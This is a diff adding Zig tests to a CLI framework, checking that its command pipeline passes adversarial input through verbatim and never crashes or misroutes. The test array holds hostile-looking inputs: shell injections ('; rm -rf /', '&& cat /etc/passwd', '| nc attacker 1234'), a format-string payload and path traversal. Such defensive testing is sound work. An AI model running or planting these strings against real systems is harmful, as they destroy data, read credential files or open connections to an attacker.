@@ -390,3 +390,82 @@ test "pipeline: postExecute receives success=true after a successful command" {
     try run(App, &.{"greet"});
     try testing.expectEqual(@as(?bool, true), PostExecPlugin.success_seen);
 }
+
+// ---------------------------------------------------------------------------
+// Pipeline robustness against adversarial input
+//
+// security_test.zig and fuzz_test.zig feed malicious input to the parsers in
+// isolation. These push it through the *whole* `app.execute` pipeline — global
+// option scanning, value consumption, routing — which has its own arg handling
+// the parser-only tests never exercise. The contract: adversarial input is
+// treated as inert data (never interpreted, never crashes the pipeline).
+// ---------------------------------------------------------------------------
+
+const adversarial_inputs = [_][]const u8{
+    "$(whoami)",
+    "`id`",
+    "; rm -rf /",
+    "&& cat /etc/passwd",
+    "| nc attacker 1234",
+    "%s%s%s%n", // format-string attack
+    "../../../../etc/passwd",
+    "\x00hidden", // embedded null byte
+    "A" ** 4096, // oversized
+};
+
+test "pipeline security: adversarial command names route safely, never to a real command" {
+    const App = zcli.Registry.init(test_config)
+        .register("greet", Greet)
+        .registerPlugin(NotFoundPlugin) // swallow CommandNotFound
+        .build();
+
+    for (adversarial_inputs) |bad| {
+        Greet.executed = false;
+        // Must not panic. An error is acceptable; a crash or misroute is not.
+        run(App, &.{bad}) catch {};
+        try testing.expect(!Greet.executed);
+    }
+}
+
+test "pipeline security: global option values pass through verbatim (no interpretation)" {
+    const App = zcli.Registry.init(test_config)
+        .register("greet", Greet)
+        .registerPlugin(GlobalOptPlugin)
+        .build();
+
+    for (adversarial_inputs) |bad| {
+        GlobalOptPlugin.level_seen = null;
+        // `--level <bad>`: the value is consumed and handed to the plugin as-is.
+        try run(App, &.{ "--level", bad, "greet" });
+        try testing.expect(GlobalOptPlugin.level_seen != null);
+        try testing.expectEqualStrings(bad, GlobalOptPlugin.level_seen.?);
+    }
+}
+
+test "pipeline security: command arguments reach the command verbatim" {
+    const App = zcli.Registry.init(test_config)
+        .register("echo", Echo)
+        .build();
+
+    for (adversarial_inputs) |bad| {
+        Echo.last = "";
+        // A parse error is fine (no crash); when it parses, it must be literal.
+        run(App, &.{ "echo", bad }) catch continue;
+        try testing.expectEqualStrings(bad, Echo.last);
+    }
+}
+
+test "pipeline security: an oversized argument vector does not crash the pipeline" {
+    const App = zcli.Registry.init(test_config)
+        .register("echo", Echo)
+        .build();
+
+    var args = std.ArrayList([]const u8).empty;
+    defer args.deinit(testing.allocator);
+    try args.append(testing.allocator, "echo");
+    for (0..5000) |_| try args.append(testing.allocator, "x");
+
+    // Echo wants a single positional, so this errors — but it must not panic,
+    // leak, or corrupt state while scanning thousands of args.
+    run(App, args.items) catch {};
+}
